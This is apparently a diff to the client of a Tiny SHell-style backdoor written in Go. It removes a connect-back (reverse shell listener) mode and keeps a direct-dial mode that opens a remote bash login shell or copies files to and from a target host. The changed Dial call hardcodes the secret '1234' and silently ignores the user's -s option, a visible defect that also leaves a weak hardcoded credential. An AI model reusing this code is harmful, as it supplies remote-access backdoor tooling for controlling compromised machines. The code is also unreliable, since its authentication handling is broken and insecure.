@@ -21,31 +21,26 @@ func Run() {
 
 	flagset := flag.NewFlagSet(filepath.Base(os.Args[0]), flag.ExitOnError)
 	flagset.StringVar(&secret, "s", "1234", "secret")
-	flagset.IntVar(&port, "p", 1234, "port")
+	flagset.IntVar(&port, "p", 60022, "port")
 	flagset.Usage = func() {
 		fmt.Fprintf(flagset.Output(), "Usage: ./%s [-s secret] [-p port] <action>\n", flagset.Name())
 		fmt.Fprintf(flagset.Output(), "  action:\n")
-		fmt.Fprintf(flagset.Output(), "        <hostname|cb> [command]\n")
-		fmt.Fprintf(flagset.Output(), "        <hostname|cb> get <source-file> <dest-dir>\n")
-		fmt.Fprintf(flagset.Output(), "        <hostname|cb> put <source-file> <dest-dir>\n")
+		fmt.Fprintf(flagset.Output(), "        <hostname> [command]\n")
+		fmt.Fprintf(flagset.Output(), "        <hostname> get <source-file> <dest-dir>\n")
+		fmt.Fprintf(flagset.Output(), "        <hostname> put <source-file> <dest-dir>\n")
 		flagset.PrintDefaults()
 	}
 	flagset.Parse(os.Args[1:])
 
 	args := flagset.Args()
 	var host, srcfile, dstdir, command string
-	var isConnectBack bool
 	var mode uint8
 
 	if len(args) == 0 {
 		os.Exit(0)
 	}
 
-	if args[0] == "cb" {
-		isConnectBack = true
-	} else {
-		host = args[0]
-	}
+	host = args[0]
 	args = args[1:]
 
 	command = "exec bash --login"
@@ -65,53 +60,21 @@ func Run() {
 		command = args[0]
 	}
 
-	if isConnectBack {
-		// connect back mode
-		addr := fmt.Sprintf(":%d", port)
-		ln, err := pel.Listen(addr, secret, false)
-		if err != nil {
-			fmt.Println("Address already in use.")
-			os.Exit(0)
-		}
-		fmt.Print("Waiting for the server to connect...")
-		layer, err := ln.Accept()
-		ln.Close()
-		if err != nil {
-			fmt.Print("\nPassword: ")
-			fmt.Scanln()
-			fmt.Println("Authentication failed.")
-			os.Exit(0)
-		}
-		fmt.Println("connected.")
-		defer layer.Close()
-		layer.Write([]byte{mode})
-		switch mode {
-		case constants.RunShell:
-			handleRunShell(layer, command)
-		case constants.GetFile:
-			handleGetFile(layer, srcfile, dstdir)
-		case constants.PutFile:
-			handlePutFile(layer, srcfile, dstdir)
-		}
-	} else {
-		addr := fmt.Sprintf("%s:%d", host, port)
-		layer, err := pel.Dial(addr, secret, false)
-		if err != nil {
-			fmt.Print("Password:")
-			fmt.Scanln()
-			fmt.Println("Authentication failed.")
-			os.Exit(0)
-		}
-		defer layer.Close()
-		layer.Write([]byte{mode})
-		switch mode {
-		case constants.RunShell:
-			handleRunShell(layer, command)
-		case constants.GetFile:
-			handleGetFile(layer, srcfile, dstdir)
-		case constants.PutFile:
-			handlePutFile(layer, srcfile, dstdir)
-		}
+	addr := fmt.Sprintf("%s:%d", host, port)
+	layer, err := pel.Dial(addr, "1234", false)
+	if err != nil {
+		fmt.Printf("Authentication failed: %v\n", err)
+		os.Exit(0)
+	}
+	defer layer.Close()
+	layer.Write([]byte{mode})
+	switch mode {
+	case constants.RunShell:
+		handleRunShell(layer, command)
+	case constants.GetFile:
+		handleGetFile(layer, srcfile, dstdir)
+	case constants.PutFile:
+		handlePutFile(layer, srcfile, dstdir)
 	}
 }
 
